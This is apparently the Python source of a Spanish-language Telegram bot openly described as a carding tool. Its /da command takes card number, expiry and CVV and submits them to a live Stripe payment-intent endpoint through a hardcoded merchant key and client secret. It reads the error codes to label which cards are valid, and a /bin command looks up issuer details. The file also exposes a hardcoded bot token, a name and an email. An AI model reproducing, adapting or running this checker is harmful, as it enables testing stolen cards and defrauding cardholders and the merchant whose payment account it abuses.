import logging
import os
import requests
import time
import string
import random
from urllib.request import urlopen
import json
import string
import random

from aiogram import Bot, Dispatcher, executor, types
from aiogram.types import ReplyKeyboardMarkup, ReplyKeyboardRemove, KeyboardButton
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from random import randint
with open('owner.txt', 'r') as f:
    owner_ids = [int(line.strip()) for line in f]


from aiogram import Bot, Dispatcher, executor, types
from bs4 import BeautifulSoup

comand = "/.,*"
bot = bool(os.environ.get('bot', True))
token = os.environ.get("token", None)

bot = Bot(token="6055899490:AAEfy1wViQ54O62uJL6tmVfOK8co88GQjvE", parse_mode=types.ParseMode.HTML)
iniciar = Dispatcher(bot)

button1 = InlineKeyboardButton(text="👤Creador👤", callback_data="creador")
button2 = InlineKeyboardButton(text="🔥GATE FREE🔥", callback_data="gate")
button3 = InlineKeyboardButton(text="💰SCRAPPER FREE💰", callback_data="randomvalue_of10")
keyboard_inline = InlineKeyboardMarkup().add(button1, button2, button3)

keyboard1 = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True).add("👋 Hello!", "💋 Youtube")



@iniciar.message_handler(commands=['start'])
async def start_answer(message: types.Message):
    await message.answer_photo('https://imgur.com/a/Q1HKwlL', "<b>Bienvenido a 𝐊𝐔𝐑𝐀𝐌𝐀 𝐂𝐇𝐊 -Creado como una herramienta Carding. Mi creador @DarwinOficial Para acceder a mas información ejecuta el comando /cmds.</b>", reply_markup=keyboard_inline)



@iniciar.callback_query_handler(text=["randomvalue_of10", "creador", "gate"])
async def random_value(call: types.CallbackQuery):
    if call.data == "creador":
        await call.message.answer("🔥BOT CREATE BY🔥: @DarwinOficial")
    if call.data == "gate":
        await call.message.answer("🔥GATE FREE🔥: Para utiizar el checker d CC utiliza los comandos= .da  -   /da - Charged$1.00usd By: @DarwinOficial")
    elif call.data == "randomvalue_of10":
        await call.message.answer("💰UNETE A NUESTRO SCRAPPER GRATUITO: @KURAMAVIPSCRAPPER💰")
    await call.answer()
    




##
session = requests.session() 
##



@iniciar.message_handler(commands=['bin'], commands_prefix=comand)
async def helpstr(message: types.Message):
    await message.answer_chat_action("typing")
    BIN = message.text[len("/bin "): 11]
    if len(BIN) < 6:
        return await message.reply("<b>Lo siento acabas de ingresar el bin de forma incorrecta /bin 422345</b>")
    if not BIN:
        return await message.reply("Did u Really Know how to use me.")
    apis = requests.get(f"https://bins-su-ani.vercel.app/api/{BIN}").json()

    result=apis['result']
    msg=apis['message']
    data=apis['data']
    vendor=data['vendor']
    bn=data['bin']
    typ=data['type']
    lv=data['level']
    bank=data['bank']
    country=data['country']
    countryinfo=data['countryInfo']
    name=countryinfo['name']
    emoji=countryinfo['emoji']
    cd=countryinfo['code']
    dialCode=countryinfo['dialCode']

    await message.reply (f"""
<b> ♦️ INFORMACIÓN DEL BIN
‗‗‗‗‗‗‗❈❈‗‗‗‗‗‗‗

✦RESULTADO  : {result}
✦BIN : ¨{bn}
✦VENDOR : {vendor}
✦TYPE : {typ}
✦LEVEL : {lv}
✦BANK : {bank}
✦COUNTRY : {country}
✦NAME : {name}
✦EMOJI : {emoji}
✦CODE : {cd}
✦DIALCODE : {dialCode}</b>
""") 




@iniciar.message_handler(commands=['key_pb'])
def handle_key_pb(message):
    if message.from_user.id in owner_ids:
        content = message.text.split(' ', 1)[1]
        with open('keys_pb.txt', 'a') as f:
            f.write(content + '\n')
        bot.send_message(message.chat.id, "key creada con exito\n{}".format(content))
    else:
        bot.send_message(message.chat.id, "Lo siento, no tienes permiso para usar este comando")



@iniciar.message_handler(commands=["da"], commands_prefix=comand)
async def da(message: types.Message):
    ini = time.perf_counter()
    ccs = message.text[len('/da '):]
    if not ccs:
        await message.reply("♦️ ERROR INGRESE BIEN LA TARJETA EJEMPLO: 4551230001642889|08|27|788 ♦️")

    spli = ccs.split('|')
    cc = spli[0]
    mes = spli[1]
    ano = spli[2]
    cvv = spli[3] 
    
    nombre = "darwin moreno belardo"
    mail = "darwinmoreno366773@yahoo.com"
    
   
    head = {
    'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54',
    'accept': '*/*',
    'content-type': 'text/plain;charset=UTF-8'
    }
    
    api1 = session.post("https://m.stripe.com/6", headers=head).json()
    muid = api1["muid"]
    guid = api1["guid"]
    sid = api1["sid"]
    
    BIN = message.text[len("/bin "): 11]
    if len(BIN) < 6:
        return await message.reply("<b>Lo siento acabas de ingresar el bin de forma incorrecta /bin 422345</b>")
    if not BIN:
        return await message.reply("Did u Really Know how to use me.")
    apis = requests.get(f"https://bins-su-ani.vercel.app/api/{cc}").json()

    result=apis['result']
    msg=apis['message']
    data=apis['data']
    vendor=data['vendor']
    bn=data['bin']
    typ=data['type']
    lv=data['level']
    bank=data['bank']
    country=data['country']
    countryinfo=data['countryInfo']
    name=countryinfo['name']
    emoji=countryinfo['emoji']
    cd=countryinfo['code']
    dialCode=countryinfo['dialCode']
    
    #await message.reply(f""""
    #<code>{sid}                    
    #{muid}                    
    #{guid}</code>""")
    heade = {
    "authority": "api.stripe.com",
    "method": "POST",
    "path": "/v1/payment_intents/pi_3MMy6xH45YVNsLnl1LFeZs2w/confirm",
    "scheme": "https",
    "accept": "application/json",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "es-419,es;q=0.9,es-ES;q=0.8,en;q=0.7,en-GB;q=0.6,en-US;q=0.5",
    "content-length": "1123",
    "content-type": "application/x-www-form-urlencoded",
    "origin": "https://js.stripe.com",
    "referer": "https://js.stripe.com/",
    #"sec-ch-ua": "Not?A_Brand";v="8", "Chromium";v="108", "Microsoft Edge";v="108",
    "sec-ch-ua-mobile": "0",
    "sec-ch-ua-platform": "Windows",
    "user-agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54"
    }
    
    data = f'payment_method_data[type]=card&payment_method_data[billing_details][name]=andres+{nombre}&payment_method_data[billing_details][address][line1]=street+673576&payment_method_data[billing_details][address][city]=new+york&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][postal_code]=10080&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={mes}&payment_method_data[card][exp_year]={ano}&payment_method_data[guid]={guid}&payment_method_data[muid]={muid}&payment_method_data[sid]={sid}&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2Fa8d9acb3f%3B+stripe-js-v3%2Fa8d9acb3f&payment_method_data[time_on_page]=147350&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51JG9cQH45YVNsLnlQnePq30NfrdTUn6Z3yrVplXjdMjThLLPYgJlVhRoi1xKvSG1OviTpwPD0LOszRi1KrbjVbSA00RLDvD3mq&client_secret=pi_3MMy6xH45YVNsLnl1LFeZs2w_secret_tzDNmG7OCANaGHCHGzRtDGPXq'
    api2 = session.post("https://api.stripe.com/v1/payment_intents/pi_3MMy6xH45YVNsLnl1LFeZs2w/confirm", headers=heade, data=data).json()
    code = api2["error"]["code"]
    code2 = api2["error"]["message"]
   
                                                                                        
    final = time.perf_counter()     
    if 'incorrect_cvc' in code:
        await message.reply(f"""
<b>✦CHANGE AUTH✦</b>
╔═══════════════════════╗                       
╟●<b>✦CC➞</b> <code>{ccs}</code>
╟════════════════════════
╟●<b>✦Estado➞</b> 𝑨𝒑𝒑𝒓𝒐𝒗𝒆𝒅 𝑪𝑪𝑵2 ✅
╟●<b>✦Respuesta➞</b> {code2}
╟●<b>✦charged➞ $1.00 </b>
╟════════════════════════
╟●<b>✦BIN➞</b> {bn}
╟●<b>✦BANCO➞</b> {bank}  
╟●<b>✦TIPO➞</b> {typ}-{vendor}-{lv}
╟●<b>✦PAÍS➞</b> {country}-{emoji}  
╟●<b>✦Tiempo➞</b>  {final-ini:0.2} (segund)
╟════════════════════════
╟●<b>✦Bot By➞</b> @DarwinOficial
╚═══════════════════════╝
""")
    
        
    if  'card_declined' in code:
            await message.reply(f"""" 
<b>✦CHARGED AUTH✦</b>
                       
╔═══════════════════════╗                       
╟●<b>✦CC➞</b> <code>{ccs}</code>
╟════════════════════════
╟●<b>✦Estado➞</b> 𝑪𝒂𝒓𝒅 𝑫𝒆𝒄𝒍𝒊𝒏𝒆𝒅 ❌
╟●<b>✦Respuesta➞</b> {code2}
╟●<b>✦charged➞ $1.00 </b>
╟════════════════════════
╟●<b>✦BIN➞</b> {bn}
╟●<b>✦BANCO➞</b> {bank}  
╟●<b>✦TIPO➞</b> {typ}-{vendor}-{lv}
╟●<b>✦PAÍS➞</b> {country}-{emoji}  
╟●<b>✦Tiempo➞</b>  {final-ini:0.2} (segund)
╟════════════════════════
╟●<b>✦Bot By➞</b> @DarwinOficial
╚═══════════════════════╝ """)
        
    elif 'incorrect_number' in code:
        await message.reply(f"""" 
<b>✦CHARGED AUTH✦</b>
                       
╔═══════════════════════╗                       
╟●<b>✦CC➞</b> <code>{ccs}</code>
╟════════════════════════
╟●<b>✦Estado➞</b> 𝑰𝒏𝒄𝒐𝒓𝒓𝒆𝒄𝒕 𝑵𝒖𝒎𝒃𝒆𝒓 ❌
╟●<b>✦Respuesta➞</b> {code2}
╟●<b>✦charged➞ $1.00 </b>
╟════════════════════════
╟●<b>✦BIN➞</b> {bn}
╟●<b>✦BANCO➞</b> {bank}  
╟●<b>✦TIPO➞</b> {typ}-{vendor}-{lv}
╟●<b>✦PAÍS➞</b> {country}-{emoji}  
╟●<b>✦Tiempo➞</b>  {final-ini:0.2} (segund)
╟════════════════════════
╟●<b>✦Bot By➞</b> @DarwinOficial
╚═══════════════════════╝ """)
    
    
 
    else:
        await message.reply(f"""
<b>✦CHARGED AUTH✦</b>
                       
╔═══════════════════════╗                       
╟●<b>✦CC➞</b> <code>{ccs}</code>
╟════════════════════════
╟●<b>✦Estado➞</b> {code}
╟●<b>✦Respuesta➞</b> {code2}
╟●<b>✦charged➞ $1.00 </b>
╟════════════════════════
╟●<b>✦BIN➞</b> {bn}
╟●<b>✦BANCO➞</b> {bank}  
╟●<b>✦TIPO➞</b> {typ}-{vendor}-{lv}
╟●<b>✦PAÍS➞</b> {country}-{emoji}  
╟●<b>✦Tiempo➞</b>  {final-ini:0.2} (segund)
╟════════════════════════
╟●<b>✦Bot By➞</b> @DarwinOficial
╚═══════════════════════╝

""")
          

print("CODIGO EN LINEA")
logging.basicConfig(level=logging.INFO)

if __name__ == '__main__':
    executor.start_polling(iniciar, skip_updates=True)
